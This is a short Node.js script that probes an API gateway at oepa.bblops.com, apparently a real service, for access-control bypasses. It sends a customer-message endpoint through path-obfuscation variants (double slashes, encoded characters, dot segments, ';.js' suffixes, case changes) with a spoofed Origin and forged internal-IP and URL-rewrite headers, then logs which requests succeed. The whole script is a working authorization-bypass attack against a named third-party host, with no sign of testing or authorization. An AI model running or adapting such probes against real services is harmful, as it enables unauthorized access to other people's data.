const {ProxyAgent, fetch}=require('undici');
const d=new ProxyAgent(process.env.HTTPS_PROXY||'http://127.0.0.1:7890');
const UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36';
const base='https://oepa.bblops.com/csm/gateway';
const tests=[
 ['GET','/cus/message/page'],
 ['POST','/cus/message/page'],
 ['POST','//cus/message/page'],
 ['POST','/cus//message/page'],
 ['POST','/cus/message/page/'],
 ['POST','/cus/message/page;.js'],
 ['POST','/%63us/message/page'],
 ['POST','/cus/%6dessage/page'],
 ['POST','/cus/message/../message/page'],
 ['POST','/cus/./message/page'],
 ['POST','/CUS/message/page'],
];
(async()=>{for(const [m,p] of tests){try{const r=await fetch(base+p,{method:m,headers:{'user-agent':UA,'origin':'https://support.bambulab.com','content-type':'application/json','x-forwarded-for':'127.0.0.1','x-real-ip':'127.0.0.1','x-original-url':p,'x-rewrite-url':p},body:m==='POST'?'{"cursor":"","limit":20}':undefined,dispatcher:d,signal:AbortSignal.timeout(15000)});const t=await r.text();console.log(r.status,m,p,'|',t.slice(0,160).replace(/\s+/g,' '));}catch(e){console.log('ERR',m,p,e.message)}}})();
